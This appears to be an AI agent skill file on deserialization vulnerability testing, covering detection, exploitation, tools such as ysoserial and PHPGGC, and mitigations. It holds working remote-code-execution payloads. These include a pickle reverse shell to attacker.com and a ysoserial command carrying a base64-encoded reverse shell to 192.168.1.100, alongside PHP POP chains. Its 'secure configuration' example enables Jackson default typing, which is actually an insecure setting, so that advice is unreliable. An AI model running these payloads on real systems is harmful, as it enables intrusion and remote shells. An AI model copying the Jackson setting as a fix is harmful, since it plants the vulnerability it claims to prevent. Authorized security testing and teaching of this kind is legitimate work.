---
name: deserialization-testing
description: Professional skills and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

Deserialization vulnerabilities exploit flaws in how applications deserialize untrusted data, potentially leading to remote code execution, denial of service, and more. This skill provides methods for detecting, exploiting, and protecting against deserialization vulnerabilities.

## Vulnerability Principle

When an application deserializes serialized data into objects, if the data source is untrusted, an attacker can craft malicious serialized data to execute arbitrary code during the deserialization process.

## Common Formats

### Java

**Common libraries:**
- Java native serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methods

### 1. Identify Serialized Data

**Java serialization characteristics:**
```
AC ED 00 05 (hexadecimal)
rO0 (Base64)
```

**PHP serialization characteristics:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle characteristics:**
```
\x80\x03
```

### 2. Detect Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cache data
- Message queues

### 3. Java Deserialization

**Apache Commons Collections exploitation:**
```java
// Use ysoserial to generate payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# Generate Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encode
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Use gadget chain to construct malicious object
// Reference ysoserial source code
```

### PHP RCE

**Exploiting POP chains:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Use different gadget chains:**
- If CommonsCollections is filtered, try Spring
- If a certain version is filtered, try other versions

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool Usage

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate Payload
./phpggc Monolog/RCE1 system id

# Generate encoded Payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept requests containing serialized data
2. Use plugin to generate Payload
3. Replace original data
4. Observe response

## Validation and Reporting

### Validation Steps

1. Confirm the ability to control serialized data
2. Verify deserialization triggers code execution
3. Assess impact (RCE, data leakage, etc.)
4. Document complete POC

### Reporting Key Points

- Vulnerability location and serialized data format
- Gadget chain or exploitation method used
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, use secure serialization, etc.)

## Protective Measures

### Recommended Solutions

1. **Avoid deserializing untrusted data**
   - Use JSON instead
   - Use secure serialization formats

2. **Input Validation**
   ```java
   // Whitelist class name validation
   private static final Set<String> ALLOWED_CLASSES =
       Set.of("com.example.SafeClass");

   private Object readObject(ObjectInputStream ois) {
       // Validate class name
       // ...
   }
   ```

3. **Use Secure Configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD,
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Class Loader Isolation**
   - Use custom ClassLoader
   - Restrict loadable classes

5. **Monitoring and Logging**
   - Log deserialization operations
   - Monitor abnormal behavior

## Notes

- Only perform testing in authorized test environments
- Be aware of gadget chain differences across library versions
- Watch for payload size limits during testing
- Understand the target application's dependency library versions
